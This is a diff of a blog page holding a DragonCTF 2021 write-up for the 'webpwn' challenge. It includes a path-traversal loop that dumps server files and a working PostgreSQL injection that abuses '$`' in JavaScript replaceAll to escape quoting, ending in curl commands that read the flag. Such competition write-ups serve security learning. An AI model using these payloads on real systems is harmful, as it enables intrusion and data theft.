@@ -27,15 +27,15 @@
 <meta name="twitter:title" content="DragonCTF 2021 Writeup"/>
 <meta name="twitter:description" content="DragonCTF 2021 Writeup for Web challenge -- webpwn"/>
 <meta name="twitter:site" content="@Sud0u53r"/>
-<link rel="preload" href="https://Sud0u53r.github.io/css/bundle.min.63b7b82d478e522a90ea9bdc402b2adc8c8a6628aa4c169b00c47271e3562766.css" integrity="sha256-Y7e4LUeOUiqQ6pvcQCsq3IyKZiiqTBabAMRyceNWJ2Y=" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
-<noscript><link rel="stylesheet" href="https://Sud0u53r.github.io/css/bundle.min.63b7b82d478e522a90ea9bdc402b2adc8c8a6628aa4c169b00c47271e3562766.css" integrity="sha256-Y7e4LUeOUiqQ6pvcQCsq3IyKZiiqTBabAMRyceNWJ2Y=" crossorigin="anonymous"></noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Consolas" type="text/css" media="all" referrerpolicy="no-referrer" />
+<link rel="preload" href="https://Sud0u53r.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css" integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://Sud0u53r.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css" integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin="anonymous"></noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Consolas" type="text/css" media="all" referrerpolicy="no-referrer" />
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code" type="text/css" media="all" />
 <style>
  body { font-family: 'Consolas'; }
  code { font-family: 'Fira Code'; }
  code { tab-size: 4; }
 </style></head>
-  <body><script src="https://Sud0u53r.github.io/js/bootstrap.min.2ab67bcb0cdc2c285903b975092b17ec5977f2b2c3db9e2c397bb165a914cccf.js" integrity="sha256-KrZ7ywzcLChZA7l1CSsX7Fl38rLD254sOXuxZakUzM8=" crossorigin="anonymous"></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top">
+  <body><script src="https://Sud0u53r.github.io/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js" integrity="sha256-BiwuZrVXy3edWc7f9&#43;DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin="anonymous"></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top">
   <div class="container">
     <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
       aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
@@ -136,19 +136,19 @@
     <div class="collapse navbar-collapse" tabindex="-1" id="navbarSupportedContent" aria-labelledby="navbarSupportedContent">
       
       <ul class="navbar-nav ms-auto"><li class="nav-item">
-          <a class="nav-link" href="https://Sud0u53r.github.io/archives">
+          <a class="nav-link" href="https://Sud0u53r.github.io/archives/">
             <i class="fas fa-fw fa-file-archive"></i>Archives
           </a>
         </li><li class="nav-item">
-          <a class="nav-link" href="https://Sud0u53r.github.io/categories">
+          <a class="nav-link" href="https://Sud0u53r.github.io/categories/">
             <i class="fas fa-fw fa-folder"></i>Categories
           </a>
         </li><li class="nav-item">
-          <a class="nav-link" href="https://Sud0u53r.github.io/tags">
+          <a class="nav-link" href="https://Sud0u53r.github.io/tags/">
             <i class="fas fa-fw fa-tags"></i>Tags
           </a>
         </li><li class="nav-item">
-          <a class="nav-link" href="https://Sud0u53r.github.io/series">
+          <a class="nav-link" href="https://Sud0u53r.github.io/series/">
             <i class="fas fa-fw fa-columns"></i>Series
           </a>
         </li></ul>
@@ -226,49 +226,49 @@ I solved 1 web challange &ndash; webpwn along with my teammates <a href="https:/
 
 </p>
 <p>    If we observe the api requests from developer tools or burp proxy, we can notice the <strong>cat</strong> and <strong>ls</strong> commands send post requests to <strong>/cmd/cat</strong> and <strong>/cmd/ls</strong> with argument as post data. We can use that to do <strong>ls ..</strong> and using those filenames, we can cat all the files and save them locally.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mkdir server_files/
-<span class="k">for</span> i in <span class="k">$(</span>curl -XPOST webpwn.hackable.software:8080/cmd/ls -d <span class="s1">&#39;..&#39;</span> --output -<span class="k">)</span>
-<span class="k">do</span>
-    curl -XPOST webpwn.hackable.software:8080/cmd/cat -d <span class="s2">&#34;../</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">&#34;</span> &gt; server_files/<span class="nv">$i</span>
-<span class="k">done</span>
-</code></pre></div><p>    After looking at the <a href="files/server_files.zip">source code</a>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir server_files/
+</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>curl -XPOST webpwn.hackable.software:8080/cmd/ls -d <span class="s1">&#39;..&#39;</span> --output -<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">    curl -XPOST webpwn.hackable.software:8080/cmd/cat -d <span class="s2">&#34;../</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">&#34;</span> &gt; server_files/<span class="nv">$i</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>    After looking at the <a href="files/server_files.zip">source code</a>
  of the server, we can see that the author used custom function to make prepared statements for postgres which uses <strong><code>sqlEscape</code></strong> function. So, SQL injection is possible, if we can escape from the single quotes enforced by the sqlEscape function. And we can confirm that flag is in database by looking at the <a href="files/schema.sql">schema.sql</a>
 . But the input that is being sent to the sqlEscape function is checked against some regex to make sure that it is &ldquo;safe &amp; secure&rdquo; o_O</p>
-<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">sqlEscape</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="s2">&#34;&#39;&#34;</span> <span class="o">+</span> <span class="nb">String</span><span class="p">(</span><span class="nx">value</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[^\x20-\x7e]|[&#39;]/g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">prepare</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">query</span> <span class="o">=</span> <span class="nx">query</span><span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">sqlEscape</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">key</span><span class="p">]));</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="nx">query</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="cm">/*
-</span><span class="cm">prepare(&#34;SELECT * FROM notes WHERE session_id = :sid AND key = :key&#34;, {
-</span><span class="cm">    &#34;sid&#34;: req.cookies[&#34;session&#34;],
-</span><span class="cm">    &#34;key&#34;: key
-</span><span class="cm">});
-</span><span class="cm">*/</span>
-</code></pre></div><p>    The data passed to sqlEscape function can be controlled by several user inputs, but all of them have regex checks. Following are the user controlled inputs and their regex checks,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sqlEscape</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#39;&#34;</span> <span class="o">+</span> <span class="nb">String</span><span class="p">(</span><span class="nx">value</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[^\x20-\x7e]|[&#39;]/g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">prepare</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">query</span> <span class="o">=</span> <span class="nx">query</span><span class="p">.</span><span class="nx">replaceAll</span><span class="p">(</span><span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">sqlEscape</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">key</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">prepare(&#34;SELECT * FROM notes WHERE session_id = :sid AND key = :key&#34;, {
+</span></span></span><span class="line"><span class="cl"><span class="cm">    &#34;sid&#34;: req.cookies[&#34;session&#34;],
+</span></span></span><span class="line"><span class="cl"><span class="cm">    &#34;key&#34;: key
+</span></span></span><span class="line"><span class="cl"><span class="cm">});
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span></code></pre></div><p>    The data passed to sqlEscape function can be controlled by several user inputs, but all of them have regex checks. Following are the user controlled inputs and their regex checks,</p>
 <ol>
 <li><strong>req.cookies[&lsquo;session&rsquo;]</strong>: It should match with /^[a-f0-9]{32}$/. It is very strict and cannot be tampered with!</li>
 <li><strong>key</strong>: It should match with /^[A-Za-z][ -9A-Za-z]+$/. It is flexible, but cannot be used to escape out of single quotes, because single quote is filtered by the sqlEscape function.</li>
 </ol>
-<p>    sqlEscape replaces any substring that matches with /[^ -~]|[']/g with empty string. The supported characters are quite extensive, but the single quote is clearly specified to be removed.The post request route <code>/cmd/babyheap/add/</code> in babyheap.js has an extra parameter &ldquo;data&rdquo;, which doesn&rsquo;t have any regex restrictions. But, then again we&rsquo;re stuck with the regex check in sqlEscape.</p>
+<p>    sqlEscape replaces any substring that matches with /[^ -~]|[&rsquo;]/g with empty string. The supported characters are quite extensive, but the single quote is clearly specified to be removed.The post request route <code>/cmd/babyheap/add/</code> in babyheap.js has an extra parameter &ldquo;data&rdquo;, which doesn&rsquo;t have any regex restrictions. But, then again we&rsquo;re stuck with the regex check in sqlEscape.</p>
 <p>    I tried several other methods to exploit the given api routes to list and read files related to postgres data, logs, etc., but nothing worked. I then setup postgresql and the server locally for debugging.</p>
 <p>    After a while, I tried to bruteforce and check if any of the characters allowed by sqlEscape can escape from the single quotes and wrote a loop in python to check it.</p>
-<div class="highlight"><pre class="chroma"><code class="language-py3" data-lang="py3"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
-      <span class="s1">&#39;http://localhost:8080/cmd/babyheap/add/&#39;</span><span class="p">,</span>
-      <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;session=12341234123412341234123412341234&#39;</span><span class="p">,</span> <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
-      <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;testing_data_&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)})</span>
-      <span class="p">)</span><span class="o">.</span><span class="n">text</span>
-    <span class="p">)</span>
-</code></pre></div><p>    The output came like this&hellip;</p>
-<pre><code>32 ok
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py3" data-lang="py3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;http://localhost:8080/cmd/babyheap/add/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;session=12341234123412341234123412341234&#39;</span><span class="p">,</span> <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;testing_data_&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">      <span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span></code></pre></div><p>    The output came like this&hellip;</p>
+<pre tabindex="0"><code>32 ok
 33 ok
 34 ok
 35 ok
@@ -294,38 +294,38 @@ I solved 1 web challange &ndash; webpwn along with my teammates <a href="https:/
 </p>
 <p>    We get postgres syntax errors if we send <strong>$</strong> or <strong>$`</strong> at the end of the data string as in the above image. Now all we have to do is to craft a payload that doesn&rsquo;t raise sql error and inserts flag into the table. I have tried so many things, but nothing worked. My teammate <a href="https://twitter.com/rekter0" target="_blank" rel="noopener noreferrer">@rekter0</a>
  discovered that we can use <strong>$`</strong> to escape out of quotes and a postgres keyword to correct the syntax error.</p>
-<div class="highlight"><pre class="chroma"><code class="language-py3" data-lang="py3"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
-<span class="nb">print</span><span class="p">(</span>
-  <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
-    <span class="s1">&#39;http://localhost:8080/cmd/babyheap/add&#39;</span><span class="p">,</span> 
-    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
-      <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
-    <span class="p">},</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
-      <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,$$$$BBBB$$$$)-- -&#39;</span><span class="p">,</span>
-      <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;AAAA$`&#39;</span>
-    <span class="p">})</span>
-  <span class="p">)</span><span class="o">.</span><span class="n">text</span>
-<span class="p">)</span>
-</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-postgresql" data-lang="postgresql"><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">notes</span> <span class="p">(</span><span class="k">key</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="k">data</span><span class="p">)</span> <span class="k">VALUES</span> 
-<span class="p">(</span>
-  <span class="s1">&#39;IS NULL),($$AAAA$$,$$00000000000000000000000000000000$$,$$BBBB$$)-- -&#39;</span><span class="p">,</span>
-  <span class="s1">&#39;cb215752f36ff8d1b0b5418c84df8d35&#39;</span><span class="p">,</span>
-  <span class="s1">&#39;AAAAINSERT INTO notes (key, session_id, data) VALUES (&#39;</span><span class="k">IS</span> <span class="k">NULL</span>
-<span class="p">),</span>
-<span class="p">(</span>
-  <span class="sh">$$AAAA$$</span><span class="p">,</span>
-  <span class="sh">$$00000000000000000000000000000000$$</span><span class="p">,</span>
-  <span class="sh">$$BBBB$$</span>
-<span class="p">)</span><span class="c1">-- -&#39;, &#39;cb215752f36ff8d1b0b5418c84df8d35&#39;, &#39;)
-</span></code></pre></div><p>    The above payload inserts two rows into the notes table, one with current session_id, given key and data, and another one with session_id &ldquo;00000000000000000000000000000000&rdquo;, key as &ldquo;AAAA&rdquo; and data as &ldquo;BBBB&rdquo;. So we can use an inner query in place of &ldquo;BBBB&rdquo; to read the flag and send another request with above session_id and key to get the flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py3" data-lang="py3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;http://localhost:8080/cmd/babyheap/add&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,$$$$BBBB$$$$)-- -&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;AAAA$`&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postgresql" data-lang="postgresql"><span class="line"><span class="cl"><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">notes</span> <span class="p">(</span><span class="k">key</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="k">data</span><span class="p">)</span> <span class="k">VALUES</span> 
+</span></span><span class="line"><span class="cl"><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;IS NULL),($$AAAA$$,$$00000000000000000000000000000000$$,$$BBBB$$)-- -&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;cb215752f36ff8d1b0b5418c84df8d35&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;AAAAINSERT INTO notes (key, session_id, data) VALUES (&#39;</span><span class="k">IS</span> <span class="k">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="sh">$$AAAA$$</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="sh">$$00000000000000000000000000000000$$</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="sh">$$BBBB$$</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="c1">-- -&#39;, &#39;cb215752f36ff8d1b0b5418c84df8d35&#39;, &#39;)
+</span></span></span></code></pre></div><p>    The above payload inserts two rows into the notes table, one with current session_id, given key and data, and another one with session_id &ldquo;00000000000000000000000000000000&rdquo;, key as &ldquo;AAAA&rdquo; and data as &ldquo;BBBB&rdquo;. So we can use an inner query in place of &ldquo;BBBB&rdquo; to read the flag and send another request with above session_id and key to get the flag.</p>
 <p><strong>Final payload:</strong></p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl webpwn.hackable.software:8080/cmd/babyheap/add <span class="se">\
-</span><span class="se"></span>-d <span class="s1">&#39;{&#34;key&#34;:&#34;IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,(select flag from flag))-- -&#34;,&#34;data&#34;:&#34;AAAA$`&#34;}&#39;</span><span class="p">;</span> echo<span class="p">;</span>
-
-curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
-</span><span class="se"></span>-H <span class="s1">&#39;Cookie: session=00000000000000000000000000000000&#39;</span><span class="p">;</span> echo<span class="p">;</span>
-</code></pre></div><p><img class="img-fluid" alt="image5.png" src="https://Sud0u53r.github.io/posts/dragonctf2021/images/img5.png" loading="lazy"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl webpwn.hackable.software:8080/cmd/babyheap/add <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;key&#34;:&#34;IS NULL),($$$$AAAA$$$$,$$$$00000000000000000000000000000000$$$$,(select flag from flag))-- -&#34;,&#34;data&#34;:&#34;AAAA$`&#34;}&#39;</span><span class="p">;</span> echo<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s1">&#39;Cookie: session=00000000000000000000000000000000&#39;</span><span class="p">;</span> echo<span class="p">;</span>
+</span></span></code></pre></div><p><img class="img-fluid" alt="image5.png" src="https://Sud0u53r.github.io/posts/dragonctf2021/images/img5.png" loading="lazy"
    width="943" height="123"
    />
 
@@ -335,6 +335,10 @@ curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
   <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
     <a href="https://Sud0u53r.github.io/posts/kernelctf2021/">KernelCTF 2021 Writeups
 </a>
+  </div><div class="post-nav post-next">
+    <a href="https://Sud0u53r.github.io/posts/ethernaut-challenges/">Ethernaut Challenges Writeup
+</a>
+    <i class="fas fa-fw fa-chevron-right"></i>
   </div></div><section class="related-posts-wrapper">
     <h3>Related Posts</h3>
     <ul class="related-posts"><li><a href="https://Sud0u53r.github.io/posts/tokyowesternsctf2020/">TokyoWesterns CTF 2020 Writeup [Urlcheck V1&amp;V2]
@@ -354,24 +358,23 @@ curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
   
    />
 </div>
-    <div class="col-12 profile-meta"><div class="profile-name">Akash Gurugunti</div><div class="profile-bio">Backend Developement &amp; Cyber Security</div><div class="profile-company"><i class="fas fa-fw fa-building"></i> Job Hunting</div><br /><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i> Visakhapatnam, India</div><br /><div class="profile-about"><i class="fas fa-fw fa-user"></i><a href="https://Sud0u53r.github.io/about/"> About Me</a></div><br /></div>
+    <div class="col-12 profile-meta"><div class="profile-name">Akash Gurugunti</div><div class="profile-bio">Cyber Security, Blockchain</div><div class="profile-company"><i class="fas fa-fw fa-building"></i> OtterSec LLC</div><br /><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i> Visakhapatnam, India</div><br /><div class="profile-about"><i class="fas fa-fw fa-user"></i><a href="https://Sud0u53r.github.io/about/"> About Me</a></div><br /></div>
   </div>
 </section>
   <section class="featured-posts row card component">
     <div class="card-body">
       <h2 class="card-title">Featured Posts</h2>
-      <ul><li><a href="https://Sud0u53r.github.io/posts/dragonctf2021/">DragonCTF 2021 Writeup
-</a></li><li><a href="https://Sud0u53r.github.io/posts/kernelctf2021/">KernelCTF 2021 Writeups
+      <ul><li><a href="https://Sud0u53r.github.io/posts/ethernaut-challenges/">Ethernaut Challenges Writeup
 </a></li></ul>
     </div>
   </section><section class="recent-posts row card component">
   <div class="card-body">
     <h2 class="card-title">Recent Posts</h2>
-    <ul><li><a href="https://Sud0u53r.github.io/posts/dragonctf2021/">DragonCTF 2021 Writeup
+    <ul><li><a href="https://Sud0u53r.github.io/posts/ethernaut-challenges/">Ethernaut Challenges Writeup
+</a></li><li><a href="https://Sud0u53r.github.io/posts/dragonctf2021/">DragonCTF 2021 Writeup
 </a></li><li><a href="https://Sud0u53r.github.io/posts/kernelctf2021/">KernelCTF 2021 Writeups
 </a></li><li><a href="https://Sud0u53r.github.io/posts/tokyowesternsctf2020/">TokyoWesterns CTF 2020 Writeup [Urlcheck V1&amp;V2]
 </a></li><li><a href="https://Sud0u53r.github.io/posts/allesctf2020/">AllesCTF 2020 Writeup [Only Freights]
-</a></li><li><a href="https://Sud0u53r.github.io/posts/gynvael-coldwind-twitter-challenges/">Gynvael Coldwind Twitter Challenges
 </a></li></ul>
   </div>
 </section><section class="taxonomies row card component">
@@ -396,8 +399,14 @@ curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
             ctfs
           </a><a href="https://Sud0u53r.github.io/tags/web/" class="badge bg-primary text-white rounded post-taxonomy" title="web">
             web
+          </a><a href="https://Sud0u53r.github.io/tags/blockchain/" class="badge bg-primary text-white rounded post-taxonomy" title="blockchain">
+            blockchain
           </a><a href="https://Sud0u53r.github.io/tags/challenge/" class="badge bg-primary text-white rounded post-taxonomy" title="challenge">
             challenge
+          </a><a href="https://Sud0u53r.github.io/tags/ethereum/" class="badge bg-primary text-white rounded post-taxonomy" title="ethereum">
+            ethereum
+          </a><a href="https://Sud0u53r.github.io/tags/evm/" class="badge bg-primary text-white rounded post-taxonomy" title="evm">
+            evm
           </a><a href="https://Sud0u53r.github.io/tags/misc/" class="badge bg-primary text-white rounded post-taxonomy" title="misc">
             misc
           </a><a href="https://Sud0u53r.github.io/tags/twitter/" class="badge bg-primary text-white rounded post-taxonomy" title="twitter">
@@ -419,10 +428,10 @@ curl webpwn.hackable.software:8080/cmd/babyheap/read/AAAA <span class="se">\
         <i class="fa-fw fa-2x fab fa-twitter"></i>
       </a></nav>
 <div class="copyright mb-2">
-  Copyright © 2018-2022 Akash Gurugunti. All Rights Reserved.
+  Copyright © 2018-2023 Akash Gurugunti. All Rights Reserved.
 </div>
 </footer>
-<script src="https://Sud0u53r.github.io/js/bundle.min.7bc8e502a64250aecf4fc34b32376b235f1ccfd00b5d1d7c8b4c587fd695735c.js" integrity="sha256-e8jlAqZCUK7PT8NLMjdrI18cz9ALXR18i0xYf9aVc1w=" crossorigin="anonymous" defer></script><script defer src="https://Sud0u53r.github.io/js/viewer.min.8009d731f8f286eba7810e149f470a6d38d8e496d51395b90ca7f2d0431e5516.js" integrity="sha256-gAnXMfjyhuungQ4Un0cKbTjY5JbVE5W5DKfy0EMeVRY=" crossorigin="anonymous"></script><script defer src="https://Sud0u53r.github.io/js/katex.min.9f106aeac559dd4631d9ae0297c064cc4faf49bcdab9d75eb03f573f0ea90a66.js" integrity="sha256-nxBq6sVZ3UYx2a4Cl8BkzE&#43;vSbzauddesD9XPw6pCmY=" crossorigin="anonymous"></script>
+<script src="https://Sud0u53r.github.io/js/bundle.min.dfff1fab09c570894e719d1447ee731c8bb5a1e57e18d45beff274823da322f0.js" integrity="sha256-3/8fqwnFcIlOcZ0UR&#43;5zHIu1oeV&#43;GNRb7/J0gj2jIvA=" crossorigin="anonymous" defer></script><script defer src="https://Sud0u53r.github.io/js/viewer.min.2b366f6cb186c9ce6e41936589e36005bc87d36452602e9aea75f196009e8b95.js" integrity="sha256-KzZvbLGGyc5uQZNlieNgBbyH02RSYC6a6nXxlgCei5U=" crossorigin="anonymous"></script><script defer src="https://Sud0u53r.github.io/js/katex.min.affcdb0c3de1260e0074ae86bffee9280f85eb73debefdce021e5d030c262a17.js" integrity="sha256-r/zbDD3hJg4AdK6Gv/7pKA&#43;F63Pevv3OAh5dAwwmKhc=" crossorigin="anonymous"></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
